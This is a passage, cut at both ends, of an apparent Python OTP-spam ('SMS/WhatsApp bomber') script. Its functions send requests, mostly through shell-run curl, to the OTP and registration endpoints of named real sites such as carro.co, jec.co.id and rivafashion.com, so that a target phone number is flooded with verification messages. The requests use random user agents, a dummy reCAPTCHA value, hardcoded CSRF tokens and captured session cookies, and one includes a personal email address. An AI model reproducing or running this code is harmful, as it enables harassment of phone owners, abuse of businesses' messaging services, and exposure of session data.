cf_clearance=WGR.MGEa4UU0ZxdEVIwLOv5sfHpdgKnUG916yHcVigE-1784474119-1.2.1.1-tsze3pbi8pCNyF_J11EryCZz7P78u_cYluNy.PNJBIxYh9zhM4_pto2BBAd6f65.6CuMSSQPLuRQojy5gGtMYqvp_vfm1IQ9W42VuDhBETtRR9OiJf6B7y4gP0JwKHEXZkFbfNugtKdonoXSQmezhr.gX1a8LpuEUwKb_1ebP_AKmck6z0YnBK6zfxZsaptPT24wViudMt7eTeo8zJcUwRuAsW2kiMR5xj2kL774YNdaS8ZZpfc8BmSOGQt64sCVT9Jy9wT0W9LKcRVqoUH0Xht_8F68VYi5I29VIrK4OSVRTSrT..RNpyZXmxknlYkZHZOTQzLqKgSZQ5_nlUSgFg; __cf_bm=N.yhTYi6ikXVdOVLPWJrfc4gfnJqvkHA4pysnjPjp9k-1784474119.371274-1.0.1.1-GQ.D5nngKtBUGDeO5ueyHgFNNdWXLHdxtsxcUE63Tnpyx4wSdsy2yplAjPoQOly7gwY36P9bonbnnEoUMfvlAJP2DFAhfQspOpEhms6XXUsD1.9ejWiU3nk_RQXiSiGq; scarab.visitor=%22195488A3EF1F1312%22; hardwareId=EMS2D-AF23A_4955e428-f3e9-43db-8d3a-7e0c71350f52; _gcl_au=1.1.1919541313.1784098500.-.-.1784474130.450855288.1784474131.1784474130; mycookies=s7; system_token=uSiiHEFq6k_cwJDq-Kn_sV0csNc; ttcsid=1784474133713::0WWL-1SZUwys7jVXthPb.2.1784474138259.0::1.-20188.213::4440.2.440.578::0.0.0; ttcsid_C6FGON96L5602R4VI2T0=1784474133705::vmd0mCMg8vz-zJIItvYq.2.1784474138260.0; ttcsid_D2I412BC77U9B02M0UGG=1784474133725::W9t_dL9b1tFKGthRORIF.2.1784474138261.0; _ga_RB1QMC9XF8=GS2.1.s1784474131$o2$g0$t1784474138$j53$l0$h1755439970'
        }

        payload = {
            "phoneNumber": phone,
            "isCheckOtpLimit": False,
            "uniqueID": phone,
            "isLogin": False
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

    except Exception as e:
        return False

def spam_otp_carro(phone):
    try:
        p = normalize_phone(phone)
        if p.startswith('0'):
            msisdn = '+62' + p[1:]
        elif p.startswith('62'):
            msisdn = '+' + p
        else:
            msisdn = '+' + p

        session = requests.Session()

        headers_get = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Referer": "https://carro.co/",
            "User-Agent": random.choice(USER_AGENTS),
        }
        session.get("https://carro.co/", headers=headers_get, timeout=15)

        url = "https://carro.co/_actions/requestOtp"
        headers_post = {
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://carro.co",
            "Referer": "https://carro.co/id/id",
            "User-Agent": random.choice(USER_AGENTS),
            "X-Requested-With": "XMLHttpRequest",
        }
        payload = {
            "countryCode": "id",
            "locale": "id",
            "mobileNumber": msisdn,
            "provider": "whatsapp",
            "recaptchaAction": "id_idid_requestOtp",
            "recaptchaResponse": "dummy_recaptcha_response_12345"
        }
        resp = session.post(url, json=payload, headers=headers_post, timeout=30)

        if 200 <= resp.status_code <= 299:
            try:
                data = resp.json()
                if data.get("success") == True or data.get("status") == "success":
                    return True
            except:
                pass
            return True
        return False
    except:
        return False

def spam_otp_amaha(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor

        nomor = ''.join(filter(str.isdigit, nomor))

        if nomor.startswith('0'):
            nomor = nomor[1:]

        import subprocess
        import json

        url = f"https://api.theinnerhour.com/v1/get_otp?country_code=62&mobile_country=Indonesia&mobile={nomor}&login=yes"

        curl_cmd = f"""curl -s -X GET '{url}' \\
  -H 'accept: */*' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'origin: https://www.amahahealth.com' \\
  -H 'referer: https://www.amahahealth.com/' \\
  -H 'sec-ch-ua: "Google Chrome";v="150", "Chromium";v="150", "Not)A;Brand";v="24"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-site: cross-site' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'priority: u=1, i' \\
  -H 'platform: mobile' \\
  -H 'x-country: IN' \\
  -H 'x-timezone: Asia/Jakarta'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success' or data.get('otp_sent'):
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_idealz(nomor):
    try:
        if nomor.startswith('0'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor[2:]
        elif nomor.startswith('+62'):
            nomor = nomor[3:]
        else:
            nomor = nomor

        nomor = ''.join(filter(str.isdigit, nomor))

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://www.idealzlebanon.com/on/demandware.store/Sites-idealz-lb-Site/en/Gupshup-SmsAuthWeb' \\
  -H 'host: www.idealzlebanon.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://www.idealzlebanon.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.idealzlebanon.com/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  --data-raw 'phoneNumber={nomor}&countryCode=%2B62&isApp=false&mode=whatsapp'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_myvalue(nomor):
    try:
        if nomor.startswith('0'):
            nomor = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            nomor = nomor[1:]
        elif nomor.startswith('62'):
            nomor = nomor
        else:
            nomor = '62' + nomor

        nomor = ''.join(filter(str.isdigit, nomor))

        import subprocess
        import json

        payload = json.dumps({
            "username": nomor,
            "template": "myvalue",
            "sendProvider": "whatsapp"
        })

        curl_cmd = f"""curl -s -X POST 'https://auth.myvalue.id/v2/verification/send' \\
  -H 'host: auth.myvalue.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/json' \\
  -H 'x-client-id: MyValueWeb' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://auth.myvalue.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  -d '{payload}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_joob(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://api.joob.asia/v3/auth/otp/issue' \\
  -H 'host: api.joob.asia' \\
  -H 'x-platform: MOBILE_WEB' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-usertype: s' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'x-lang: id' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'content-type: application/json' \\
  -H 'x-deviceid: b19391d2-4ca0-4eb3-92ae-2dc3da3f8d4a' \\
  -H 'accept: */*' \\
  -H 'origin: https://grab.joob.id' \\
  -H 'sec-fetch-site: cross-site' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://grab.joob.id/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  -d '{{"otpAuthType":"PHONE","phoneNumber":"{phone}"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                if data.get('data') and data['data'].get('otpSent'):
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_datascripmall(nomor):
    try:
        if nomor.startswith('0'):
            phone = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            phone = '+62' + nomor
        elif nomor.startswith('+62'):
            phone = nomor
        else:
            phone = '+62' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('62'):
            phone = '62' + phone

        phone = '+' + phone

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://datascripmall.id/api/app/buyer/register/request-otp' \\
  -H 'host: datascripmall.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://datascripmall.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://datascripmall.id/register/perorangan' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.1.657807458.1785422889; moe_uuid=5cefeacf-f41d-4d22-8644-578bb5a6751e; _fbp=fb.1.1785422886169.83826567122468884.AQYAAQIB; _gcl_aw=GCL.1785423521.CjwKCAjw7KvTBhA6EiwAWnutYZTFUrVgZnPcuE2Vm8b1x-lclJCkOgLxSOZXqD9XVffjvY0oVuRyGRoCdqYQAvD_BwE; _gcl_gs=2.1.k1$i1785423512$u152165420; __Host-next-auth.csrf-token=293c40a1d89e1ebf1f65529dae844021c68bf527b9010349cba333fad1321d6c%7C89d0644d6e9f85d2222e64176b6f94408161531bceedf2cc64dde51ddd332cc4; __Secure-next-auth.callback-url=https%3A%2F%2Fdatascripmall.id; last_visited_page=%2F; _gcl_au=1.1.782293264.1785422888.-.-.1785422889.136969314.1787146397.1787146396; _ga_ZRQCEHEE7M=GS2.1.s1787146396$o2$g1$t1787146435$j21$l0$h0' \\
  -H 'priority: u=1, i' \\
  -d '{{"email":"Tono34Jo80byats@gmail.com","phone_number":"{phone}","channel":"wa"}}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_rivafashion(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json

        form_key = "JKiGdrKGYAkW2J8p"

        curl_cmd = f"""curl -s -X POST 'https://www.rivafashion.com/en/web/register/send' \\
  -H 'host: www.rivafashion.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://www.rivafashion.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.rivafashion.com/en/customer/account/create/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: PHPSESSID=8j7i0etigbuoe10vqtjttoimo7; form_key=JKiGdrKGYAkW2J8p; mage-messages=; popup-timing=0; homepagecountrylangmodal=yes; user_allowed_save_cookie=%7B%221%22%3A1%7D; unbxd.userId=uid-1786008968826-52393; unbxd.visit=first_time; unbxd.visitId=visitId-1786008968840-95946; moe_c_s=1; _fbp=fb.1.1786008970673.274662173564343403; _ga=GA1.1.1840547569.1786008971; _twpid=tw.1786008971673.899374785113090323; _gcl_au=1.1.1404030908.1786008972; moe_uuid=264fe380-7149-4bee-9e60-00833114b93b; cto_bundle=BB_lVF9IaWpNUHklMkI4NWNQVUdqdkdMTGc5VmY5c0pZVTl6aGRhMWxKZTFWT3h6ZFZtaGlJWGVBQjdIZDglMkIlMkZhU0NGTCUyRlBiM2Naa0ZpeGJvTVdJWiUyQjdnUHJXVWcwZnh2cWFvMDBLTUpONnpDWUJGTTg4MWNFMjRlamNBJTJGN1NLZ2piczJrYkplZDZPTVglMkZQQkxQZHZUJTJCNm9MT1hRJTNEJTNE; _tt_enable_cookie=1; _ttp=01KZB6WBTW26NYM8K3P9V73DWQ_.tt.1; moe_u_d=Hcc7CoAwDADQu2Q2Q-wH62VKahIQCoK1k3h3S8f3QstXFdiNa9MFJLOIj93n-znAJAYWwoenW4BfaGEbIdDKTGuRokCGXw_; moe_s_a_s=5; moe_o_s_t=1786008975067; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-banners-cache-storage=%7B%7D; _scid=WsV9gSuqkOO3v9yeQPJoKkvaOQgORiT1; selected_country=yes; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; moe_s_d=DY7LjoIwAEX_petRgyBBdpRHRRgVBRQ2phQYXpYKRWZi_Pfp6uYmN_ecN8iBDirO2aivVvM8L4f6hUs8VnVPl6R_gC_AxSK3OhxRSotdrxsnYytl9uT4WnM_PinRnHK-yujBh2RMShkTvD5PpuznSXqT4i5o7dgyeMGulqog_lsRNPrwQG5ZmBot4tc2I1HZSdDkd9eqpKdaexEk-Oa1qjuwTdieA0-pk8Hc0pRFC2jIG_J3LqBb5EKvEHqlyBbob8BEgYaaHeKqiboLKue1Ju_oWJmXeB_IP0oy7oOpRuGFO_vBtVplF_dH7RU3UnP0vx1HLil6TqekG0a25kZ2V02cJ6iuIoHA4p2EBWkcR7IX0DZZ5_kpgzgAn88_; rivacategory=6227; referrer=www.rivafashion.com; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22w2J8YXRV0e0SHnDBgZLV%22%2C%22expiryDate%22%3A%222027-08-06T09%3A36%3A37.574Z%22%7D; moe_s_n=PcpBDoMwDETRu3idSB6XJIarVJVFIyNVVdtF2FXcHcKC5bz5f2r2polYMeYZOS41zXFwQdQqHuEoz8VFExKFI2620oSimVnHIkVuXT-nKnOgai9b-7w_-uNXD1bGoAj0tZ-1Q7cd; _ga_7K2P0W12ET=GS2.1.s1786008971$o1$g1$t1786009001$j30$l0$h0; moe_h_a_s=1; _scid_r=U0V9gSuqkOO3v9yeQPJoKkvaOQgORiT1C-p1aQ; private_content_version=f4210cb5f2c0ea6d1249c78e962f93f6; section_data_ids=%7B%22messages%22%3A1786009132%7D; ttcsid=1786008973225::TC4pCvDydHRHBuVJLI15.1.1786009132053.0::1.-4944.28677::158776.27.231.747::109090.3.9; ttcsid_CCDJ753C77U0P3N5FH9G=1786008973218::sUXaI8Qyy66gbrdU81p3.1.1786009132053.1' \\
  -H 'priority: u=1, i' \\
  --data-raw 'mobile_number={phone}&phone_code=%2B62&form_key={form_key}'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False
def spam_otp_buccheri(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor[2:]
        elif nomor.startswith('+62'):
            phone = nomor[3:]
        else:
            phone = nomor

        phone = ''.join(filter(str.isdigit, phone))

        import subprocess
        import json

        curl_cmd = f"""curl -s -X POST 'https://member.buccheri.com/otp-sent' \\
  -H 'host: member.buccheri.com' \\
  -H 'cache-control: max-age=0' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'upgrade-insecure-requests: 1' \\
  -H 'content-type: application/x-www-form-urlencoded' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'origin: https://member.buccheri.com' \\
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: navigate' \\
  -H 'sec-fetch-user: ?1' \\
  -H 'sec-fetch-dest: document' \\
  -H 'referer: https://member.buccheri.com/otp' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.1.517445661.1786009922; _clck=umhr0c%5E2%5Eg8d%5E0%5E2409; _clsk=furbu5%5E1786009926484%5E1%5E1%5Ez.clarity.ms%2Fcollect; _ga_4FSQVMN5FX=GS2.1.s1786009922$o1$g1$t1786009978$j4$l0$h0; ci_session=091bc4bfe7b2c6ab4427214bfbe54337138963cd' \\
  -H 'priority: u=0, i' \\
  --data-raw 'phonenumber={phone}&otptype=SIGNUP'"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_jec(nomor):
    try:
        if nomor.startswith('0'):
            phone = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor
        else:
            phone = '62' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        import subprocess
        import json

        token = "qfKK4y73SkCXC5MhZlI70Ivw5Xqe1i0cjrbBxK1p"
        rdr = "eyJpdiI6InczVHdsQ2NwZzJjQ1JWVGhDQ1FZK0E9PSIsInZhbHVlIjoiTnU5RXF0WWNWUCs5Slc4MnM1eXBxT2kxQmhlTW1sVHl4UmJKMGg3RVIzST0iLCJtYWMiOiI2NjBkZTk1MjQyMTE3NTI4MGVlMTBkMzIwNzVkZGY5MjBjMTI1ZGVlMGRkMGUyMWZkZWVhZmEyZTU4Yzk0NDIyIiwidGFnIjoiIn0%3D"

        curl_cmd = f"""curl -s -X POST 'https://jec.co.id/id/login-via-otp' \\
  -H 'host: jec.co.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://jec.co.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://jec.co.id/id' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _ga=GA1.3.755083444.1786010701; _gid=GA1.3.1346297291.1786010702; _fbp=fb.2.1786010702252.193345616220197204; _clck=40kett%5E2%5Eg8d%5E0%5E2409; moe_uuid=eed3e8e0-f7fb-43d9-b932-9dd06765b995; _clsk=1br6z3c%5E1786010704900%5E1%5E1%5Ez.clarity.ms%2Fcollect; _ga_VW5EHP2HBV=GS2.1.s1786010701$o1$g1$t1786010718$j43$l0$h0; _gcl_au=1.1.916045630.1786010701.-.-.1786010719.883151778.1786010719.1786010727; XSRF-TOKEN=eyJpdiI6Ii9kY0VzVUZNS09vTU5LWHlKNHA5SEE9PSIsInZhbHVlIjoiOWQ3R053U3ExVW80TjJlMXEzRVJIWDhoQnRjOU92TzJIVHNqU3ltWThZcDVQd1JKVi9Xeng1K0lHOGNvcHJsMHpGVEl0elI5YSt1SS93MWpWdVV6SDZjbTJES281ZlV6WGQybmIxQVEvMEpMTDdqNW83d3ZuTXN6czZTSDFoUy8iLCJtYWMiOiJhNWNjNDc1YTk2ZmUzZDVkZDQ0Y2E3OTUwMjU5NTJmMmI0ZjBhNzJhZDdiMGFhNmE2MDM1MzZhYTA3ZWFkZGU2IiwidGFnIjoiIn0%3D; jec_fe_production_session=eyJpdiI6ImVFMUZ5Wk00NXk1OXBEbHJobnhKenc9PSIsInZhbHVlIjoiRmU4ZUlQSWVxcjFDVXF3dkFIYWlyR290UlROZEVINFIvZ0ltWkYvcU1NcDVxVVQ3bVVwclhxTkMwSFg1d2Eyd1BCQ1d2YThUckt4QTJVdEhzNXl0UVZCbGdJTWpTck5wV2hBM2RlMzFIazZycjdsQVNpZ3pWYzFxd25McXJxL1QiLCJtYWMiOiIwNzBiMzY4NzQ2NTA3NmU2YjUxMThkOThhMGE2MGNhZmIwODM2YzBmMmU2NTI4ZWI2OWE3ZGNiNzgxYzUxYjU0IiwidGFnIjoiIn0%3D' \\
  --data-raw '_token={token}&loginparam=&rdr={rdr}&mobile={phone}&remember_me=1&tos=1&otp%5B%5D=&otp%5B%5D=&otp%5B%5D=&otp%5B%5D='"""

        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)

        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False

    except Exception as e:
        return False

def spam_otp_generasimaju(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor

        phone = ''.join(filter(str.isdigit, phone))

        if not phone.startswith('0'):
            phone = '0' + phone

        import subprocess
        import json
        import base64
        import random
        import string

        firstname = ''.join(random.choices(string.ascii_lowercase, k=8))
        password = base64.b64encode(f"{firstname}12345".encode()).decode()
        csrf_token = "1a6d98f9901ed40ce571b56fa1d47869841a4eda"
        auth_token = "8af3153c67f9b3faf620b64706e18c08"

        curl_cmd = f"""curl -s -X POST 'https://www.generasimaju.co.id/klub-generasi-maju/register' \\
  -H 'host: www.generasimaju.co.id' \\
  -H 'x-newrelic-id: UA4HUV5TARAEUFFVAQQEUFY=' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-csrf-token: {csrf_token}' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjQ4MDA4MDkiLCJhcCI6IjUzODc5NTE1MCIsImlkIjoiNWJkMTE5ZTZlODllM2RiOSIsInRyIjoiN2IxNWViZmIyNGU0OTljYmZlMDNlYTJjYmEzMmI1ODUiLCJ0aSI6MTc4NzEzNjk0MTkxNiwidGsiOiIzMzIzOTI1In19' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'traceparent: 00-7b15ebfb24e499cbfe03ea2cba32b585-5bd119e6e89e3db9-01' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'tracestate: 3323925@nr=0-1-4800809-538795150-5bd119e6e89e3db9----1787136941916' \\
  -H 'origin: https://www.generasimaju.co.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.generasimaju.co.id/klub-generasi-maju/register?referral=https://www.generasimaju.co.id/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: prev_page_url=/; data_layer_method=Website; TCPID=126831854422550661387; _gid=GA1.3.2087259638.1787136887; _gat_UA-103522697-4=1; _tt_enable_cookie=1; _ttp=01M0CTHJ7ZZ53RDS1MBZ8F9B69_.tt.2; _clck=1lemkln%5E2%5Eg8q%5E0%5E2422; __stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiJlOTUxYzg1NC0zYzQzLTQxMDYtYWFlYS1iYzY0N2I2NmVhODIifQ%3D%3D; _td_ssc_id=01M0CTHMEQHN4WM22AN96N2MD6; __stgeo=IjAi; __stbpnenable=MA%3D%3D; __stdf=MA%3D%3D; PHPSESSID=d7f6086225b836d265dc047dc6526a3b; _fbp=fb.2.1787136896361.715334083778519977; iDSP_Cookie=0abf53f9-e262-4b2b-8a4a-739b0d159f83**1787136896679*8e2f9123e95944449a39a9a80babf9e4*; _ga=GA1.3.1942976718.1787136886; _td=b724781d-c825-49e6-91e0-23b4e09740b8; 